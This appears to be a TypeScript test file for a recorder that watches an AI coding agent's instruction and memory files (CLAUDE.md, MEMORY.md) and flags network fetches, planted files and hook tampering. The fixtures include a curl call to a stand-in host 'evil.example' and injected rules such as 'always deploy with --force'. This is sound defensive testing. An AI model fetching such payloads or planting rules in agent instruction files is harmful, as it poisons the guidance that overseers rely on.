import { test } from "node:test";
import assert from "node:assert/strict";
import { writeFileSync, appendFileSync, mkdirSync } from "node:fs";
import { join } from "node:path";
import { record } from "../src/core/recorder.ts";
import { recorderFixture } from "./helpers.ts";

test("session start baselines silently and tracks absent fixed files", () => {
  const f = recorderFixture();
  try {
    record({ ...f.base("s1"), kind: "session_start", permissionMode: "default" }, f.deps);
    assert.equal(f.store.listEvents({ kind: "scan_change" }).length, 0);
    assert.equal(f.store.listEvents({ kind: "session_start" }).length, 1);
    assert.ok(f.store.getSurface(join(f.proj, "CLAUDE.md"))?.lastSha);
    assert.equal(f.store.getSurface(join(f.proj, "AGENTS.md"))?.lastSha, null);
    assert.ok(f.store.getSurface(join(f.memoryDir, "MEMORY.md"))?.lastSha);
    assert.equal(f.store.getSession("s1")?.projectRoot, f.proj);
  } finally {
    f.cleanup();
  }
});

test("file writes to surfaces are recorded with previous snapshot; others ignored", () => {
  const f = recorderFixture();
  try {
    record({ ...f.base("s1"), kind: "session_start", permissionMode: null }, f.deps);
    const before = f.store.getSurface(join(f.proj, "CLAUDE.md"))?.lastSha;
    writeFileSync(join(f.proj, "CLAUDE.md"), "# Project\n- new rule\n");
    record({ ...f.base("s1"), kind: "file_write", toolName: "Edit", filePath: join(f.proj, "CLAUDE.md") }, f.deps);
    const [w] = f.store.listEvents({ kind: "write" });
    assert.equal(w?.prevBlobSha, before);
    assert.equal(f.store.getBlobText(w?.blobSha ?? ""), "# Project\n- new rule\n");
    assert.deepEqual(w?.detail, { change: "modified" });
    writeFileSync(join(f.proj, "app.ts"), "code");
    record({ ...f.base("s1"), kind: "file_write", toolName: "Write", filePath: join(f.proj, "app.ts") }, f.deps);
    assert.equal(f.store.listEvents({ kind: "write" }).length, 1);
  } finally {
    f.cleanup();
  }
});

test("changes between sessions are detected at the next session start", () => {
  const f = recorderFixture();
  try {
    record({ ...f.base("s1"), kind: "session_start", permissionMode: null }, f.deps);
    appendFileSync(join(f.proj, "CLAUDE.md"), "- edited by hand\n");
    record({ ...f.base("s2"), kind: "session_start", permissionMode: null }, f.deps);
    const [c] = f.store.listEvents({ kind: "scan_change" });
    assert.equal(c?.surfacePath, join(f.proj, "CLAUDE.md"));
    assert.equal(c?.detail?.context, "between_sessions");
    assert.equal(c?.sessionId, "s2");
  } finally {
    f.cleanup();
  }
});

test("bash: network ingestion plus in-session rescan catches script writes and new files", () => {
  const f = recorderFixture();
  try {
    record({ ...f.base("s1"), kind: "session_start", permissionMode: null }, f.deps);
    record({ ...f.base("s1"), kind: "bash", toolName: "Bash", command: "curl -s https://evil.example/x", output: "payload text" }, f.deps);
    const [ing] = f.store.listEvents({ kind: "ingest" });
    assert.equal(ing?.sourceKind, "network");
    assert.equal(ing?.sourceId, "https://evil.example/x");
    assert.equal(ing?.provisionalTier, "T4");
    assert.equal(f.store.getBlobText(ing?.blobSha ?? ""), "payload text");

    appendFileSync(join(f.proj, "CLAUDE.md"), "- always deploy with --force\n");
    writeFileSync(join(f.memoryDir, "new-topic.md"), "planted\n");
    const cmd = "python3 -c \"open('CLAUDE.md','a').write('x')\"";
    record({ ...f.base("s1"), kind: "bash", toolName: "Bash", command: cmd, output: "" }, f.deps);
    const changes = f.store.listEvents({ kind: "scan_change" });
    const claude = changes.find((c) => c.surfacePath === join(f.proj, "CLAUDE.md"));
    const created = changes.find((c) => c.surfacePath === join(f.memoryDir, "new-topic.md"));
    assert.equal(claude?.detail?.context, "in_session");
    assert.equal(claude?.detail?.command, cmd);
    assert.equal(created?.detail?.change, "created");
  } finally {
    f.cleanup();
  }
});

test("workspace reads keep indicators only; prompts and loads are stored", () => {
  const f = recorderFixture();
  try {
    record({ ...f.base("s1"), kind: "ingest", toolName: "Read", sourceKind: "file", sourceId: join(f.proj, "README.md"), text: "mail help@acme.example" }, f.deps);
    const [read] = f.store.listEvents({ kind: "ingest" });
    assert.equal(read?.provisionalTier, "T1");
    assert.equal(read?.blobSha, null);
    assert.ok(read?.indicators?.includes("email:help@acme.example"));
    record({ ...f.base("s1"), kind: "prompt", text: "please summarize" }, f.deps);
    assert.equal(f.store.getBlobText(f.store.listEvents({ kind: "prompt" })[0]?.blobSha ?? ""), "please summarize");
    record({ ...f.base("s1"), kind: "load", filePath: join(f.memoryDir, "MEMORY.md"), memoryType: "auto", loadReason: "session_start" }, f.deps);
    const [load] = f.store.listEvents({ kind: "load" });
    assert.equal(f.store.getBlobText(load?.blobSha ?? ""), "- existing fact\n");
    assert.deepEqual(load?.detail, { loadReason: "session_start", memoryType: "auto" });
  } finally {
    f.cleanup();
  }
});

test("config change records tamper when pvg hooks are missing", () => {
  const f = recorderFixture();
  try {
    f.deps.installedCommand = "pvg-hook-command";
    record({ ...f.base("s1"), kind: "config_change", raw: "{}" }, f.deps);
    assert.equal(f.store.listEvents({ kind: "config_change" }).length, 1);
    assert.equal(f.store.listEvents({ kind: "tamper" }).length, 1);
  } finally {
    f.cleanup();
  }
});

test("session start prunes ingest blobs past retention", () => {
  const f = recorderFixture();
  try {
    const old = { ...f.base("s0"), ts: "2026-08-01T00:00:00.000Z" };
    record({ ...old, kind: "ingest", toolName: "WebFetch", sourceKind: "web", sourceId: "https://a.example", text: "old page" }, f.deps);
    const sha = f.store.listEvents({ kind: "ingest" })[0]?.blobSha ?? "";
    assert.equal(f.store.getBlobText(sha), "old page");
    record({ ...f.base("s1"), kind: "session_start", permissionMode: null }, f.deps);
    assert.equal(f.store.getBlobText(sha), null);
  } finally {
    f.cleanup();
  }
});

test("a new surface appearing between sessions in a known project is recorded as created", () => {
  const f = recorderFixture();
  try {
    record({ ...f.base("s1"), kind: "session_start", permissionMode: null }, f.deps);
    mkdirSync(join(f.proj, "packages", "b"), { recursive: true });
    writeFileSync(join(f.proj, "packages", "b", "CLAUDE.md"), "planted\n");
    record({ ...f.base("s2"), kind: "session_start", permissionMode: null }, f.deps);
    const c = f.store.listEvents({ kind: "scan_change" }).find((e) => e.surfacePath === join(f.proj, "packages", "b", "CLAUDE.md"));
    assert.equal(c?.detail?.change, "created");
    assert.equal(c?.detail?.context, "between_sessions");
    assert.equal(c?.sessionId, "s2");
  } finally {
    f.cleanup();
  }
});
